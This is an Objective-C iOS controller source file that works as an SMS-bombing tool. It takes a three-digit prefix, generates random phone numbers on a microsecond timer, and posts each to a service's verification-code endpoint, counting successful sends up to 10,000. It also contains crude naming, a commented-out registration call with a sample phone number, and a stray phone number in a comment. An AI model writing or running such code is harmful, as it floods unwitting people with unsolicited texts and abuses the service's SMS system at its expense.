//
//  AAController.m
//  小工具
//
//  Created by 大炮 on 2018/10/29.
//  Copyright © 2018年 大炮. All rights reserved.
//

#import "AAController.h"
#import <AudioToolbox/AudioToolbox.h>
#import "NSUTimer.h"



@interface AAController ()
{
	UILabel *Fuck;
	NSTimer *timess;
}
@end

@implementation AAController

- (void)viewDidLoad {
	[super viewDidLoad];

	self.title = @"乐源E家";

	
	[self initUI];
}

// 17801598134

-(void)initUI
{

	Weak_self
	_textField = [[UITextField alloc]initWithFrame:RectMake(50, 100, AppWidth - 100, 44) textColor:[UIColor redColor] font:Font(17) placeholder:@"请输入一个三位数" inView:self.view];
	_textField.backgroundColor = [UIColor whiteColor];

	_laber = [[UILabel alloc]initWithFrame:RectMake(50, _textField.height+_textField.y +10, _textField.width, _textField.height) font:Font(17) inView:self.view];
	_laber.backgroundColor = [UIColor whiteColor];

	_laberone = [[UILabel alloc]initWithFrame:RectMake(50, _textField.height+_textField.y +64, _textField.width, _textField.height) font:Font(17) inView:self.view];
	_laberone.backgroundColor = [UIColor whiteColor];

	UIButton *but = [[UIButton alloc]initWithFrame:RectMake(50, _laber.height+_laber.y +300, _laber.width, _laber.height) Title:@"开始" TitleColor:[UIColor yellowColor] Fout:17 BgColor:[UIColor redColor] BgImage:nil inView:self.view];

	[but initEventWithHandler:^(UIButton *sener) {

		self->timess = [NSTimer scheduledTimerWithTimeInterval:0.000001 target:self selector:@selector(RunTime:) userInfo:nil repeats:true];


	}];







}


-(void)RunTime:(NSTimer *)timer
{

	NSString *str = [NSString stringWithFormat:@"%@%@",_textField.text,[self randomPassword]];
	NSDictionary *dic = @{@"mobile":str,
						  @"scene":@(2),
						  @"type":@"mobile"};
	[GCD moreGlobalQueueApplyWith:1 doSomething:^(size_t qw) {


		if (self.index < 10000)
		{
			self.phone = [NSString stringWithFormat:@"%@%@",self.textField
						  .text,[self randomPassword]];
			BOOL isbool = [Validate validateMobile:self.phone];
			if (isbool == YES)
			{
				self.laber.text = [NSString stringWithFormat:@"电话：%@",self.phone];

				[Network caoNiMaMaPWith:YanZheng Params:dic Successfrl:^(id responseObjectDic) {


					if ([[responseObjectDic valueForKey:@"msg"] isEqualToString:@"发送成功,请注意查收"])
					{
						self.laberone.text = [NSString stringWithFormat:@"成功+%d",self.index];
						self.index ++;
					}else
					{
						self.laberone.text = @"失败";
					}

				} orFailurs:^(id error) {

					self.laberone.text = @"失败";

				}];
			}



		}else
		{

			[timess invalidate];
			timess = nil;
			self.laber.text = @"今天不玩了";
		}
	}];













}






-(NSString *)randomPassword{

	//自动生成8位随机密码
	NSTimeInterval random=[NSDate timeIntervalSinceReferenceDate];
	NSString *randomString = [NSString stringWithFormat:@"%.8f",random];
	NSString *randompassword = [[randomString componentsSeparatedByString:@"."]objectAtIndex:1];
	return randompassword;
}

-(void)touchesBegan:(NSSet<UITouch *> *)touches withEvent:(UIEvent *)event
{

	[self.view endEditing:YES];
}


//NSDictionary *dic = @{@"phoneNum":@"13967542822",
//					  @"codeStr":@"231904",
//					  @"pwdStr":@"123456",
//					  @"againPwd":@"123456"
//					  };
// 注册接口
//[Network caoNiMaMaPWith:ZhuCeng Params:dic Successfrl:^(id responseObjectDic) {
//
//	NSLog(@"%@",responseObjectDic);
//} orFailurs:^(id error) {
//
//	NSLog(@"%@",error);
//}];















-(void)dealloc
{
    NSLog(@"挂了挂了");
}


@end
